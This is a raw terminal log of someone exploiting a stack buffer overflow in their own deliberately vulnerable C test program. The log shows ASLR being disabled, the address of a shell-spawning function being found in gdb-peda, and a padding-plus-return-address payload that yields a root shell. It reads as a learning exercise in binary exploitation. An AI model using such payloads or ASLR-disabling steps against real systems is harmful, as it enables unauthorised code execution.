@@ -1,0 +1,1110 @@
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=lls[?1l>
+kls\[0m[01;32ma.out[0m  in  peda-session-a.out.txt  peda-session-dash.txt  screenlog.0  test.c
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=ccat test.c[?1l>
+kcat\void run_shell() {
+    system("/bin/sh");
+}
+
+void vul() {
+    char s[0x10];
+    scanf("%s", s);
+}
+
+int main() {
+    vul();
+    return 0;
+}[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=
+bck-i-search: _[KM[11Crm screenlo[4mg[24m.0[1B[26Dg_M[21C[11D[4mg[4mc[24mc -m32 te[24mst.c[1B[26Dc_M[9C[4mg[4mc[4mc[24m[1B[13Dc_M[8C[24mg[24mc[24mc[1B[KM[26C[?1l>[1Bkgcc\test.c: In function ‘vul’:
+test.c:7:5: warning: incompatible implicit declaration of built-in function ‘scanf’
+     scanf("%s", s);
+     ^
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=
+bck-i-search: _[KM[11Cgcc -m32 te[4ms[24mt.c[1B[27Ds_M[21C[11D[4ms[4my[24msctl -w k[24mernel.randomize_va_space=0[1B[48Dy_M[9C[4ms[4my[4ms[24m[1B[13Ds_M[8C[24ms[24my[24ms[1B[KM[27C[?1l>[1Bksysctl\kernel.randomize_va_space = 0
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=ggdb te  a.out[1m [0m[0m [?1l>
+kgdb\GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from a.out...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0mp run_shell
+$1 = {<text variable, no debug info>} 0x804842b <run_shell>
+[;31mgdb-peda$ [0mquit
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=eecho ''A'[1C * 28[?1l>
+kecho\A a.out in peda-session-a.out.txt peda-session-dash.txt screenlog.0 test.c 28
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=echo 'A' * 28     AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x2b\x84\x04\x08'[?1l>
+kecho\AAAAAAAAAAAAAAAAAAAAAAAAAAAA+�
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x2b\x84\x04\x08' > in[?1l>
+kecho\[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=../a.out[1m [0m[0m; id  ls(./a.out; ls[11D[11C) >           ( (cat in; id  ls) > ./
+[J[01;32ma.out[0m*                  [Jin                      [Jpeda-session-a.out.txt  [Jpeda-session-dash.txt   [Jscreenlog.0             [Jtest.c                [JM[0m[23m[24m[26C(cat in; ls) > ./[K   | ./a.out[1m [0m[0m [?1l>
+[Jk(cat\/bin/sh: 1: a.out: not found
+/bin/sh: 2: Syntax error: "in" unexpected
+[1]    5769 done                ( cat in; ls --color=tty; ) | 
+       5771 segmentation fault  ./a.out
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=(cat in; ls) | ./a.out[22D                      [22D(cat in; ls) | ./a.out.in; ls) | ./a.out[17D/in; ls) | ./a.out[17D[?1l>
+k(cat\/bin/sh: 1: a.out: not found
+/bin/sh: 2: Syntax error: "in" unexpected
+[1]    5841 done                ( cat ./in; ls --color=tty; ) | 
+       5842 segmentation fault  ./a.out
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=ccat in[?1l>
+kcat\AAAAAAAAAAAAAAAAAAAAAAAAAAAA+�
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=cat in(cat ./in; ls) | ./a.out[24Dcat in                  [18D   c  ../a.out[1m [0m[0m [?1l>
+k./a.out\^C
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=(()(e)c)h)o) )')A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)A)\)x)2)b)\)x)8)4)\)x)0)4)\)x)0)8)');) )l)s)[1C ) 
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=./a.outcat in (cat ./in; ls) | ./a.outels) | ./a.out[13Dcls) | ./a.out[13Dhls) | ./a.out[13Dols) | ./a.out[13D ls) | ./a.out[13D[?1l>
+k(cat\a.out  in  peda-session-a.out.txt  peda-session-dash.txt  screenlog.0  test.c
+[1]    5994 done                ( cat ./in; echo ls; ) | 
+       5995 segmentation fault  ./a.out
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=(cat ./in; echo ls) | ./a.out        [?1l>
+k(cat\AAAAAAAAAAAAAAAAAAAAAAAAAAAA+�
+ls
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=(cat ./in; echo ls) | ./a.out[?1l>
+k(cat\a.out  in  peda-session-a.out.txt  peda-session-dash.txt  screenlog.0  test.c
+[1]    6046 done                ( cat ./in; echo ls; ) | 
+       6047 segmentation fault  ./a.out
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=(cat ./in; echo ls) | ./a.out[P[11C [12D[P[11C [12D[P[11C [12D[P[11C [12D[P[11C [12D[P[11C [12D[P[11C [12Dc) | ./a.out[11Da) | ./a.out[11Dt) | ./a.out[11D[?1l>
+k(cat\id
+uid=0(root) gid=0(root) groups=0(root)
+ls  ls
+a.out  in  peda-session-a.out.txt  peda-session-dash.txt  screenlog.0  test.c
+pwd
+/root/test
+[1]    6086 done                ( cat ./in; cat; ) | 
+       6088 segmentation fault  ./a.out
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=mmkdir subdir[?1l>
+kmkdir\[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=ccp a.out[1m [0m[0m subdir[1m/[0m[0m [?1l>
+kcp\[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;32m➜  [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=cp a.out subdir[15Dmkdir subdir   [12D(cat ./in; cat) | ./a.out[?1l>
+k(cat\pwd
+/root/test
+^C
+[1]    6169 interrupt           ( cat ./in; cat; ) | 
+       6170 segmentation fault  ./a.out
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=(cat ./in; cat) | ./a.out     subdir[1m/[0m[0m/a.out[1m [0m[0m [?1l>
+k(cat\^[[A^[[A^[[A            pwd
+/root/test
+^C
+[1]    6197 interrupt           ( cat ./in; cat; ) | 
+       6199 segmentation fault  ./subdir/a.out
+[1m[3m#[23m[1m[0m                                                                                                                                                                                                            k~/test\[0m[23m[24m[J[01;31m➜ [23m [01;34m([01;35mRipples-Kali[01;34m)[00m[01;32m [36m~/test [01;34m[01;34m [00m[K[?1h=ggdb a.out[1m [0m[0m [?1l>
+kgdb\GNU gdb (Debian 7.7.1+dfsg-5) 7.7.1
+Copyright (C) 2014 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+Reading symbols from a.out...(no debugging symbols found)...done.
+[;31mgdb-peda$ [0mr
+Starting program: /root/test/a.out 
+^C
+Program received signal SIGINT, Interrupt.
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0xfffffe00 
+[;32mEBX[0m: 0x0 
+[;32mECX[0m: [;34m0xf7fd7000[0m --> 0x0 
+[;32mEDX[0m: 0x400 
+[;32mESI[0m: [;34m0xf7facc20[0m --> 0xfbad2288 
+[;32mEDI[0m: [;34m0xf7facac0[0m --> 0xfbad2084 
+[;32mEBP[0m: [;34m0xf7e02700[0m (0xf7e02700)
+[;32mESP[0m: [;34m0xffffcc98[0m --> [;34m0xf7e02700[0m (0xf7e02700)
+[;32mEIP[0m: [;31m0xf7fdbc00[0m (<__kernel_vsyscall+16>:	pop    ebp)[0m
+[m[;32mEFLAGS[0m: 0x296 ([;32mcarry[0m [;1;31mPARITY[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0xf7fdbbfc <__kernel_vsyscall+12>:[;2m	nop[0m
+   0xf7fdbbfd <__kernel_vsyscall+13>:[;2m	nop[0m
+   0xf7fdbbfe <__kernel_vsyscall+14>:[;2m	int    0x80[0m
+=> 0xf7fdbc00 <__kernel_vsyscall+16>:[;1;32m	pop    ebp[0m
+   0xf7fdbc01 <__kernel_vsyscall+17>:[m	pop    edx[0m
+   0xf7fdbc02 <__kernel_vsyscall+18>:[m	pop    ecx[0m
+   0xf7fdbc03 <__kernel_vsyscall+19>:[;34m	ret    [0m
+   0xf7fdbc04:[m	lods   al,BYTE PTR ds:[esi][0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcc98[0m --> [;34m0xf7e02700[0m (0xf7e02700)[0m
+[m0004| [;34m0xffffcc9c[0m --> 0x400 [0m
+[m0008| [;34m0xffffcca0[0m --> [;34m0xf7fd7000[0m --> 0x0 [0m
+[m0012| [;34m0xffffcca4[0m --> [;31m0xf7edeed3[0m (<read+35>:	pop    ebx)[0m
+[m0016| [;34m0xffffcca8[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 [0m
+[m0020| [;34m0xffffccac[0m --> [;31m0xf7e72163[0m (<_IO_file_underflow+275>:	cmp    eax,0x0)[0m
+[m0024| [;34m0xffffccb0[0m --> 0x0 [0m
+[m0028| [;34m0xffffccb4[0m --> [;34m0xf7fd7000[0m --> 0x0 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+[mStopped reason: [;31mSIGINT[0m[0m
+0xf7fdbc00 in __kernel_vsyscall ()
+[;31mgdb-peda$ [0mp sys[K[K[K[K[Kr[Kb main
+Breakpoint 1 at 0x804846d
+[;31mgdb-peda$ [0mr < in[K[K[K[K[K[Kb vul
+Breakpoint 2 at 0x8048449
+[;31mgdb-peda$ [0mr < in
+Starting program: /root/test/a.out < in
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 
+[;32mEIP[0m: [;31m0x804846d[0m (<main+14>:	sub    esp,0x4)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048469 <main+10>:[;2m	push   ebp[0m
+   0x804846a <main+11>:[;2m	mov    ebp,esp[0m
+   0x804846c <main+13>:[;2m	push   ecx[0m
+=> 0x804846d <main+14>:[;1;32m	sub    esp,0x4[0m
+   0x8048470 <main+17>:[;32m	call   0x8048443 <vul>[0m
+   0x8048475 <main+22>:[m	mov    eax,0x0[0m
+   0x804847a <main+27>:[m	add    esp,0x4[0m
+   0x804847d <main+30>:[m	pop    ecx[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf64[0m --> [;34m0xffffcf80[0m --> 0x1 [0m
+[m0004| [;34m0xffffcf68[0m --> 0x0 [0m
+[m0008| [;34m0xffffcf6c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0012| [;34m0xffffcf70[0m --> [;31m0x8048490[0m (<__libc_csu_init>:	push   ebp)[0m
+[m0016| [;34m0xffffcf74[0m --> 0x0 [0m
+[m0020| [;34m0xffffcf78[0m --> 0x0 [0m
+[m0024| [;34m0xffffcf7c[0m --> [;31m0xf7e1ca63[0m (<__libc_start_main+243>:	mov    DWORD PTR [esp],eax)[0m
+[m0028| [;34m0xffffcf80[0m --> 0x1 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Breakpoint 1, 0x0804846d in main ()
+[;31mgdb-peda$ [0mc
+Continuing.
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEIP[0m: [;31m0x8048449[0m (<vul+6>:	sub    esp,0x8)[0m
+[m[;32mEFLAGS[0m: 0x282 ([;32mcarry[0m [;32mparity[0m [;32madjust[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048443 <vul>:[;2m	push   ebp[0m
+   0x8048444 <vul+1>:[;2m	mov    ebp,esp[0m
+   0x8048446 <vul+3>:[;2m	sub    esp,0x18[0m
+=> 0x8048449 <vul+6>:[;1;32m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[m	push   eax[0m
+   0x8048450 <vul+13>:[m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;1;4;31m	call   0x8048300 <scanf@plt>[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0004| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0008| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0012| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[m0016| [;34m0xffffcf50[0m --> 0x1 [0m
+[m0020| [;34m0xffffcf54[0m --> [;34m0xffffd014[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0024| [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 [0m
+[m0028| [;34m0xffffcf5c[0m --> [;31m0x8048475[0m (<main+22>:	mov    eax,0x0)[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+
+Breakpoint 2, 0x08048449 in vul ()
+[;31mgdb-peda$ [0mni
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: 0x1 
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf38[0m --> 0x1 
+[;32mEIP[0m: [;31m0x804844c[0m (<vul+9>:	lea    eax,[ebp-0x18])[0m
+[m[;32mEFLAGS[0m: 0x292 ([;32mcarry[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048444 <vul+1>:[;2m	mov    ebp,esp[0m
+   0x8048446 <vul+3>:[;2m	sub    esp,0x18[0m
+   0x8048449 <vul+6>:[;2m	sub    esp,0x8[0m
+=> 0x804844c <vul+9>:[;1;32m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[m	push   eax[0m
+   0x8048450 <vul+13>:[m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;1;4;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[m	add    esp,0x10[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0004| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0008| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0012| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0016| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0020| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[m0024| [;34m0xffffcf50[0m --> 0x1 [0m
+[m0028| [;34m0xffffcf54[0m --> [;34m0xffffd014[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804844c in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf38[0m --> 0x1 
+[;32mEIP[0m: [;31m0x804844f[0m (<vul+12>:	push   eax)[0m
+[m[;32mEFLAGS[0m: 0x292 ([;32mcarry[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048446 <vul+3>:[;2m	sub    esp,0x18[0m
+   0x8048449 <vul+6>:[;2m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[;2m	lea    eax,[ebp-0x18][0m
+=> 0x804844f <vul+12>:[;1;32m	push   eax[0m
+   0x8048450 <vul+13>:[m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;1;4;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[m	add    esp,0x10[0m
+   0x804845d <vul+26>:[m	leave[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0004| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0008| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0012| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0016| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0020| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[m0024| [;34m0xffffcf50[0m --> 0x1 [0m
+[m0028| [;34m0xffffcf54[0m --> [;34m0xffffd014[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x0804844f in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf34[0m --> [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEIP[0m: [;31m0x8048450[0m (<vul+13>:	push   0x8048528)[0m
+[m[;32mEFLAGS[0m: 0x292 ([;32mcarry[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x8048449 <vul+6>:[;2m	sub    esp,0x8[0m
+   0x804844c <vul+9>:[;2m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[;2m	push   eax[0m
+=> 0x8048450 <vul+13>:[;1;32m	push   0x8048528[0m
+   0x8048455 <vul+18>:[;1;4;31m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[m	add    esp,0x10[0m
+   0x804845d <vul+26>:[m	leave  [0m
+   0x804845e <vul+27>:[;34m	ret[0m[0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf34[0m --> [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0004| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0008| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0012| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0016| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
+[m0020| [;34m0xffffcf48[0m --> [;34m0x804975c[0m --> [;34m0x8049670[0m --> 0x1 [0m
+[m0024| [;34m0xffffcf4c[0m --> [;31m0x80484e2[0m (<__libc_csu_init+82>:	add    edi,0x1)[0m
+[m0028| [;34m0xffffcf50[0m --> 0x1 [0m
+[;34m[------------------------------------------------------------------------------][0m
+[mLegend: [;31mcode[0m, [;34mdata[0m, [;32mrodata[0m, value[0m
+0x08048450 in vul ()
+[;31mgdb-peda$ [0m
+[;34m[----------------------------------registers-----------------------------------][0m
+[m[;32mEAX[0m: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")
+[;32mEBX[0m: [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mECX[0m: [;34m0xffffcf80[0m --> 0x1 
+[;32mEDX[0m: [;34m0xffffcfa4[0m --> [;34m0xf7fac000[0m --> 0x1a8da8 
+[;32mESI[0m: 0x0 
+[;32mEDI[0m: 0x0 
+[;32mEBP[0m: [;34m0xffffcf58[0m --> [;34m0xffffcf68[0m --> 0x0 
+[;32mESP[0m: [;34m0xffffcf30[0m --> [;32m0x8048528[0m --> 0x7325 ('%s')
+[;32mEIP[0m: [;31m0x8048455[0m (<vul+18>:	call   0x8048300 <scanf@plt>)[0m
+[m[;32mEFLAGS[0m: 0x292 ([;32mcarry[0m [;32mparity[0m [;1;31mADJUST[0m [;32mzero[0m [;1;31mSIGN[0m [;32mtrap[0m [;1;31mINTERRUPT[0m [;32mdirection[0m [;32moverflow[0m)[0m
+[m[;34m[-------------------------------------code-------------------------------------][0m[0m
+[m   0x804844c <vul+9>:[;2m	lea    eax,[ebp-0x18][0m
+   0x804844f <vul+12>:[;2m	push   eax[0m
+   0x8048450 <vul+13>:[;2m	push   0x8048528[0m
+=> 0x8048455 <vul+18>:[;1;32m	call   0x8048300 <scanf@plt>[0m
+   0x804845a <vul+23>:[m	add    esp,0x10[0m
+   0x804845d <vul+26>:[m	leave  [0m
+   0x804845e <vul+27>:[;34m	ret    [0m
+   0x804845f <main>:[m	lea    ecx,[esp+0x4][0m[0m
+[mGuessed arguments:[0m
+[marg[0]: [;32m0x8048528[0m --> 0x7325 ('%s')[0m
+[marg[1]: [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[marg[2]: 0x1 [0m
+[m[;34m[------------------------------------stack-------------------------------------][0m[0m
+[m0000| [;34m0xffffcf30[0m --> [;32m0x8048528[0m --> 0x7325 ('%s')[0m
+[m0004| [;34m0xffffcf34[0m --> [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0008| [;34m0xffffcf38[0m --> 0x1 [0m
+[m0012| [;34m0xffffcf3c[0m --> [;31m0x80482bd[0m (<_init+9>:	add    ebx,0x149f)[0m
+[m0016| [;34m0xffffcf40[0m --> [;34m0xffffd171[0m ("/root/test/a.out")[0m
+[m0020| [;34m0xffffcf44[0m --> 0x2f ('/')[0m
